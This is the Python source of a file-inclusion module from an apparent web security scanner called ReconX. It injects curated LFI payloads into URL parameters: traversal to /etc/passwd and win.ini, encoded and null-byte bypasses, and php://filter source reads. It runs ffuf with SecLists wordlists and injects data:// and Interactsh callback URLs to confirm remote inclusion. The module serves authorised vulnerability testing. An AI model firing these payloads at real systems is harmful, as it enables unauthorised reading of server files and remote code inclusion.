"""
ReconX — Module: LFI / RFI fuzzing.

Local File Inclusion is fuzzed with **ffuf + SecLists** LFI wordlists: each
file-inclusion-prone parameter is replaced with `FUZZ`, ffuf walks the wordlist,
and `-mr` keeps only responses that contain a real file signature
(/etc/passwd's `root:x:0:0:`, Windows `[boot loader]`/`[fonts]`, PHP source).

Remote File Inclusion / URL-wrapper inclusion is checked without external
infrastructure using the `data://` wrapper: a unique marker is base64-encoded
into a `data://text/plain;base64,…` payload and the parameter is probed; if the
decoded marker is reflected, `allow_url_include` is on and remote inclusion is
possible.
"""

from __future__ import annotations

import base64
import json
import re
import time
import uuid
from pathlib import Path
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from modules.active_probe_base import ActiveProbeBase
from modules.oob_client import OOBClientMixin

# Parameter names commonly bound to file inclusion.
LFI_PARAM_HINTS = frozenset({
    "file", "page", "path", "include", "inc", "require", "template", "tpl",
    "doc", "document", "folder", "dir", "root", "pg", "view", "content",
    "load", "read", "download", "filename", "lang", "locale", "site", "show",
    "cat", "board", "detail", "mod", "module", "conf", "config", "style",
    "theme", "layout", "class", "action", "name",
})

# Default SecLists LFI wordlists (Kali path; /opt fallback handled in code).
DEFAULT_LFI_WORDLISTS = [
    "/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt",
    "/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt",
]

# ffuf -mr regex: real file-content signatures (low false-positive).
LFI_MATCH_REGEX = r"root:.*?:0:0:|\[boot loader\]|\[fonts\]|for 16-bit app support|<\?php"
# Per-signature labels for evidence.
LFI_SIGNATURES = [
    (re.compile(r"root:.*?:0:0:"), "/etc/passwd (Linux)"),
    (re.compile(r"\[boot loader\]|\[fonts\]|for 16-bit app support", re.I), "win.ini/system (Windows)"),
    (re.compile(r"<\?php"), "PHP source disclosure"),
]

# Curated, high-signal in-band LFI payloads (infra-free confirmer). Each entry is
# (payload, technique) and covers traversal depth, URL / double-URL encoding, the
# ....// normalisation bypass, legacy null-byte truncation, and Windows targets.
# php://filter source-disclosure payloads are generated per-page in _lfi_payloads.
_INBAND_LFI_BASE = [
    ("/etc/passwd", "absolute path"),
    ("../../../../../../../../etc/passwd", "path traversal"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url-encoded traversal"),
    ("..%252f..%252f..%252f..%252f..%252fetc%252fpasswd", "double-url-encoded traversal"),
    ("....//....//....//....//....//....//etc/passwd", "....// normalisation bypass"),
    ("../../../../../../etc/passwd%00", "null-byte truncation"),
    ("../../../../../../etc/passwd%00.png", "null-byte + extension"),
    ("..\\..\\..\\..\\..\\..\\windows\\win.ini", "windows traversal"),
    ("C:\\windows\\win.ini", "windows absolute path"),
]
# Long base64 blob (php://filter output) → decode and look for PHP source.
_B64_BLOB_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")


class FileInclusionModule(OOBClientMixin, ActiveProbeBase):
    name = "file_inclusion"
    description = "LFI / RFI Fuzzing (ffuf + SecLists)"
    required_tools: list[str] = []

    def __init__(self, target: str, output_dir: str, config: dict,
                 parameter_results: dict | None = None,
                 fuzzer_results: dict | None = None,
                 live_hosts: list | None = None):
        super().__init__(target, output_dir, config)
        self.parameter_results = parameter_results or {}
        self.fuzzer_results = fuzzer_results or {}
        self.live_hosts = live_hosts or []
        self._oob_process = None
        (self.module_dir / "ffuf").mkdir(exist_ok=True)

    # ── Public API ─────────────────────────────────────────────────────────────
    def run(self) -> dict:
        if not self.active_enabled():
            return {"findings": [], "total": 0, "status": "disabled"}
        cfg = self.module_config()

        targets = self.limit(self._targets(cfg), "max_targets", 30)
        if not targets:
            self.warn("No parameterised URLs for LFI/RFI fuzzing")
            return {"findings": [], "total": 0, "lfi": [], "rfi": []}

        lfi_hits: list[dict] = []
        if cfg.get("lfi", True):
            # 1. Fast infra-free in-band probe (encodings, null-byte, php://filter).
            inband = self._run_inband_lfi(targets, cfg) if cfg.get("inband_lfi", True) else []
            lfi_hits.extend(inband)
            confirmed = {(self._base(h["url"]), h["param"].lower()) for h in inband}
            # 2. Broad ffuf + SecLists sweep over params not already confirmed.
            if self.has_tool("ffuf"):
                lfi_hits.extend(self._run_lfi(targets, cfg, confirmed))
            elif not inband:
                self.warn("ffuf not installed — LFI fuzzing skipped")

        rfi_hits: list[dict] = []
        if cfg.get("rfi", True):
            rfi_hits = self._run_rfi(targets, cfg)                      # data:// wrapper (in-band)
            if cfg.get("rfi_oob", True):
                rfi_hits.extend(self._run_oob_rfi(targets, cfg))       # true remote URL via Interactsh

        findings = [self._lfi_finding(h) for h in lfi_hits] + [self._rfi_finding(h) for h in rfi_hits]
        findings = self.dedup_findings(findings)
        self.save_json({"lfi": lfi_hits, "rfi": rfi_hits}, "file_inclusion.json")
        return {
            "findings": findings,
            "total": len(findings),
            "lfi": lfi_hits,
            "rfi": rfi_hits,
            "tested": len(targets),
            "wordlists": self._wordlists(cfg),
        }

    def summary(self) -> str:
        r = self.results
        return f"📂 {len(r.get('lfi', []))} LFI, {len(r.get('rfi', []))} RFI hit(s)"

    # ── In-band LFI probe (infra-free confirmer) ────────────────────────────────
    def _run_inband_lfi(self, targets: list[dict], cfg: dict) -> list[dict]:
        """Probe each candidate with a small curated payload set and confirm via
        real file-content signatures — fast, and it catches encoding bypasses and
        php://filter source disclosure that a plain ffuf wordlist sweep misses."""
        import requests
        session = requests.Session()
        session.verify = False
        timeout = self.request_timeout()
        max_requests = int(cfg.get("max_lfi_requests", 120))
        sent = 0
        hits: list[dict] = []
        for target in targets:
            payloads = self._lfi_payloads(self._page_basename(target["url"]))
            for param in target["params"]:
                if sent >= max_requests:
                    return hits
                for payload, technique in payloads:
                    if sent >= max_requests:
                        return hits
                    probe = self._inject_value(target["url"], param, payload)
                    resp = self.http_get(probe, session=session, timeout=timeout, verify=False)
                    sent += 1
                    if resp is None:
                        continue
                    sig = self._detect_lfi(resp.text or "")
                    if sig:
                        hits.append({"url": target["url"], "param": param, "payload": payload,
                                     "match_url": probe, "status": resp.status_code,
                                     "signature": sig, "technique": technique, "tool": "in-band probe"})
                        break  # one confirmation per parameter is enough
        return hits

    def _lfi_payloads(self, page: str) -> list[tuple[str, str]]:
        payloads = list(_INBAND_LFI_BASE)
        seen: set[str] = set()
        for res in ([page] if page else []) + ["index", "index.php", "config", "config.php"]:
            if res and res not in seen:
                seen.add(res)
                payloads.append((f"php://filter/convert.base64-encode/resource={res}",
                                 f"php://filter source read ({res})"))
        return payloads

    @staticmethod
    def _detect_lfi(body: str) -> str:
        if re.search(r"root:.*?:0:0:", body):
            return "/etc/passwd (Linux)"
        if re.search(r"\[fonts\]|\[extensions\]|for 16-bit app support", body, re.I):
            return "win.ini (Windows)"
        if "<?php" in body:
            return "PHP source disclosure"
        for blob in _B64_BLOB_RE.findall(body):
            try:
                decoded = base64.b64decode(blob, validate=True)
            except Exception:
                continue
            if b"<?php" in decoded or b"<?=" in decoded:
                return "PHP source via php://filter (base64)"
        return ""

    @staticmethod
    def _page_basename(url: str) -> str:
        name = urlparse(url).path.rsplit("/", 1)[-1]
        return name if name and "." in name else ""

    # ── LFI via ffuf + SecLists ─────────────────────────────────────────────────
    def _run_lfi(self, targets: list[dict], cfg: dict, skip: set | None = None) -> list[dict]:
        skip = skip or set()
        wordlists = self._wordlists(cfg)
        if not wordlists:
            self.warn("No LFI wordlist found (set scan.file_inclusion.lfi_wordlists)")
            return []
        self.info(f"LFI fuzzing {len(targets)} target(s) with {len(wordlists)} wordlist(s)")
        threads = str(self._bounded(cfg.get("threads", 30), 1, 100))
        rate = str(self._bounded(cfg.get("rate", 0), 0, 1000))
        timeout = str(self._bounded(cfg.get("request_timeout", 10), 1, 120))
        exec_timeout = int(cfg.get("ffuf_timeout", 300))

        hits: list[dict] = []
        index = 0
        for target in targets:
            for param in target["params"]:
                if (self._base(target["url"]), param.lower()) in skip:
                    continue  # already confirmed by the in-band probe
                fuzz_url = self._inject_fuzz(target["url"], param)
                for wordlist in wordlists:
                    index += 1
                    out = self.module_dir / "ffuf" / f"lfi_{index:03d}.json"
                    cmd = [
                        "ffuf", "-u", fuzz_url, "-w", f"{wordlist}:FUZZ",
                        "-mc", "all", "-mr", LFI_MATCH_REGEX,
                        "-t", threads, "-timeout", timeout,
                        "-of", "json", "-o", str(out), "-s", "-noninteractive",
                    ]
                    if rate != "0":
                        cmd += ["-rate", rate]
                    self.exec(cmd, timeout=exec_timeout, label=f"ffuf LFI {param}")
                    hits.extend(self._parse_ffuf(out, target["url"], param, wordlist))
        return hits

    def _parse_ffuf(self, out_path: Path, url: str, param: str, wordlist: str) -> list[dict]:
        data = self.load_json(out_path)
        results = data.get("results", []) if isinstance(data, dict) else []
        hits: list[dict] = []
        for res in results:
            payload = (res.get("input", {}) or {}).get("FUZZ", "")
            if not payload:
                continue
            hits.append({
                "url": url, "param": param, "payload": payload,
                "match_url": res.get("url", ""), "status": res.get("status"),
                "length": res.get("length"), "wordlist": Path(wordlist).name,
                "signature": self._signature_for(payload),
            })
        return hits

    @staticmethod
    def _signature_for(payload: str) -> str:
        low = payload.lower()
        if "passwd" in low or "/etc/" in low:
            return "/etc/passwd (Linux)"
        if "win.ini" in low or "boot.ini" in low or "system32" in low:
            return "Windows system file"
        if "php://" in low or "filter" in low:
            return "PHP wrapper / source"
        return "file signature matched"

    # ── RFI / URL-wrapper inclusion (infra-free, data:// marker) ────────────────
    def _run_rfi(self, targets: list[dict], cfg: dict) -> list[dict]:
        import requests
        session = requests.Session()
        session.verify = False
        timeout = self.request_timeout()
        max_requests = int(cfg.get("max_rfi_requests", 80))
        sent = 0
        hits: list[dict] = []
        for target in targets:
            for param in target["params"]:
                if sent >= max_requests:
                    return hits
                marker = f"RECONXFI{uuid.uuid4().hex[:8]}"
                b64 = base64.b64encode(marker.encode()).decode()
                for payload in (f"data://text/plain;base64,{b64}", f"data://text/plain,{marker}"):
                    if sent >= max_requests:
                        return hits
                    probe = self._inject_value(target["url"], param, payload)
                    resp = self.http_get(probe, session=session, timeout=timeout, verify=False)
                    sent += 1
                    if resp is not None and marker in (resp.text or ""):
                        hits.append({"url": target["url"], "param": param,
                                     "payload": payload, "marker": marker,
                                     "wrapper": "data://"})
                        break
        return hits

    # ── RFI via OOB Interactsh callback (true remote inclusion) ──────────────────
    def _run_oob_rfi(self, targets: list[dict], cfg: dict) -> list[dict]:
        """Confirm real Remote File Inclusion: inject an attacker URL on the
        Interactsh callback domain; if the server fetches it (allow_url_include),
        Interactsh records the interaction — proof of remote inclusion."""
        runtime = self._start_oob_runtime(cfg)
        callback = str(runtime.get("callback_url", "")).strip()
        if not callback:
            if runtime.get("client_available") is False:
                self.info("interactsh-client not installed — OOB RFI skipped")
            else:
                self.info("No Interactsh callback URL — OOB RFI skipped")
            self._stop_oob_client(runtime)
            return []

        timeout = self.request_timeout()
        max_requests = int(cfg.get("max_rfi_requests", 80))
        sent: list[dict] = []
        try:
            for target in targets:
                for param in target["params"]:
                    if len(sent) >= max_requests:
                        break
                    token = f"rfi{len(sent):04d}"
                    payload = self._oob_url(callback, token, "/reconx.txt")
                    probe = self._inject_value(target["url"], param, payload)
                    self.http_get(probe, timeout=timeout, verify=False)
                    sent.append({"url": probe, "param": param, "payload": payload, "token": token})

            wait = float(cfg.get("rfi_oob_wait", runtime.get("cooldown_period", 5)))
            if wait > 0:
                time.sleep(wait)

            interactions = self._read_oob_interactions(runtime)
            hits: list[dict] = []
            for item in sent:
                matches = self._matching_interactions(interactions, item["token"], callback)
                if matches:
                    hits.append({"url": item["url"], "param": item["param"], "payload": item["payload"],
                                 "marker": item["token"], "wrapper": "http:// (OOB)",
                                 "callback_url": callback, "interactions": matches[:5],
                                 "tool": "interactsh"})
            return hits
        finally:
            self._stop_oob_client(runtime)

    # ── Findings ────────────────────────────────────────────────────────────────
    def _lfi_finding(self, hit: dict) -> dict:
        return self.make_finding(
            "lfi_detected",
            hit.get("match_url") or hit["url"],
            title=f"Local File Inclusion via '{hit['param']}' ({hit['signature']})",
            description=("ffuf matched a file-inclusion payload that returned real file content, "
                         "confirming Local File Inclusion. Validate scope of readable files manually."),
            severity="HIGH",
            confidence=0.85,
            finding_type="lfi_detected",
            exploitability="confirmed",
            evidence={"param": hit["param"], "payload": hit["payload"],
                      "signature": hit["signature"], "status": hit.get("status"),
                      "wordlist": hit.get("wordlist", ""), "technique": hit.get("technique", ""),
                      "tool": hit.get("tool", "ffuf")},
        )

    def _rfi_finding(self, hit: dict) -> dict:
        oob = hit.get("tool") == "interactsh"
        evidence = {"param": hit["param"], "payload": hit["payload"],
                    "marker": hit["marker"], "wrapper": hit["wrapper"]}
        if oob:
            evidence["callback_url"] = hit.get("callback_url", "")
            evidence["interactions"] = hit.get("interactions", [])
        return self.make_finding(
            "rfi_detected",
            hit["url"],
            title=(f"Remote File Inclusion via '{hit['param']}' (OOB callback)" if oob
                   else f"Remote/URL-wrapper inclusion via '{hit['param']}' (data://)"),
            description=(
                "The parameter caused the server to fetch an attacker-controlled remote URL — an "
                "Interactsh callback fired, confirming Remote File Inclusion (allow_url_include on)."
                if oob else
                "A data:// wrapper payload was reflected, showing the parameter includes URL "
                "wrappers (allow_url_include on) — Remote File Inclusion is possible."),
            severity="HIGH",
            confidence=0.95 if oob else 0.8,
            finding_type="rfi_detected",
            exploitability="confirmed",
            evidence=evidence,
        )

    # ── Target / wordlist / URL helpers ─────────────────────────────────────────
    def _targets(self, cfg: dict) -> list[dict]:
        fuzz_all = cfg.get("fuzz_all_params", False)
        targets: dict[str, set] = {}

        def add(url: str, param: str):
            url, param = str(url or ""), str(param or "")
            if not url.startswith(("http://", "https://")) or not param:
                return
            if not self.is_in_scope(url):
                return
            if not fuzz_all and param.lower() not in LFI_PARAM_HINTS:
                return
            targets.setdefault(url, set()).add(param)

        for item in self.parameter_results.get("parameters", []) or []:
            if isinstance(item, dict):
                add(item.get("url", ""), item.get("param") or item.get("name", ""))
        urls = set(self.parameter_results.get("parameterized_targets", []) or [])
        classified = self.fuzzer_results.get("classified", {}) or {}
        urls.update(classified.get("with_params", []) or [])
        urls.update(u for u in self.fuzzer_results.get("all_endpoints", []) or [] if "?" in str(u))
        for url in urls:
            for param, _ in parse_qsl(urlparse(str(url)).query, keep_blank_values=True):
                add(str(url), param)

        max_params = int(cfg.get("max_params_per_target", 3))
        return [{"url": url, "params": sorted(params)[:max_params]} for url, params in targets.items()]

    def _wordlists(self, cfg: dict) -> list[str]:
        configured = cfg.get("lfi_wordlists") or DEFAULT_LFI_WORDLISTS
        found: list[str] = []
        for path in configured:
            if Path(path).exists():
                found.append(path)
            else:
                # Fall back to the /opt/SecLists layout if the Kali path is absent.
                alt = path.replace("/usr/share/wordlists/seclists", "/opt/SecLists")
                if Path(alt).exists():
                    found.append(alt)
        return found

    @staticmethod
    def _inject_fuzz(url: str, param: str) -> str:
        return FileInclusionModule._inject_value(url, param, "FUZZ")

    @staticmethod
    def _inject_value(url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        pairs = parse_qsl(parsed.query, keep_blank_values=True)
        names = {k for k, _ in pairs}
        updated = [(k, value if k == param else v) for k, v in pairs]
        if param not in names:
            updated.append((param, value))
        # urlencode leaves the bare FUZZ keyword intact (no reserved chars), so
        # ffuf still sees it in the query string.
        return urlunparse(parsed._replace(query=urlencode(updated, doseq=True)))

    @staticmethod
    def _base(url: str) -> str:
        parsed = urlparse(url)
        return urlunparse(parsed._replace(query="", fragment=""))

    @staticmethod
    def _bounded(value, minimum: int, maximum: int) -> int:
        try:
            return max(minimum, min(maximum, int(value)))
        except (TypeError, ValueError):
            return minimum
